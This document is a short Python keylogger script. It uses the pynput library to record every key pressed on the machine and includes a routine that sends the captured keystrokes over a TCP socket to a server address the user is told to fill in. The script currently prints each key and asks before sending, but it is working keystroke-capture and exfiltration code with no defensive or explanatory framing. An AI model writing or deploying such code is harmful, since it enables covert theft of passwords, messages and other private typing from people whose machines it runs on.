import socket
from pynput import keyboard

# In-memory list to store key presses
key_presses = []

# Function to send key presses over the network
def send_over_network(keys):
    host = '127.0.0.1'  # Change this to your server's IP address
    port = 12345       # Change this to the desired port

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            s.sendall('Keys pressed: {}'.format(keys).encode())
        return True
    except (ConnectionRefusedError, ConnectionError) as e:
        print(f'Error connecting to the server: {e}')
        return False
    except Exception as e:
        print(f'An error occurred while sending data: {e}')
        return False

# Function to handle key press events
def on_key_press(key):
    try:
        key_presses.append(key)  # Store the key press in memory
        print(f'Key {key} pressed')  # Print the key press to the console
    except Exception as e:
        print(f'An error occurred: {e}')

# Create a keyboard listener
with keyboard.Listener(on_press=on_key_press) as listener:
    print('Listening for keyboard events in RAM (promiscuous). Press Ctrl+C to exit.')
    try:
        listener.join()
    except KeyboardInterrupt:
        print("KeyboardInterrupt: Exiting gracefully.")

# Ask the user if they want to send data over the network or print to the console
print("Collected key presses:", key_presses)
choice = input("Do you want to send data over the network or print to the console? Enter 'network' or 'console': ")

if choice == "network":
    if send_over_network(key_presses):
        print("Data sent over the network.")
    else:
        print("Error sending data over the network. Exiting.")
else:
    print("Collected key presses:", key_presses)  # Print the collected key presses to the console
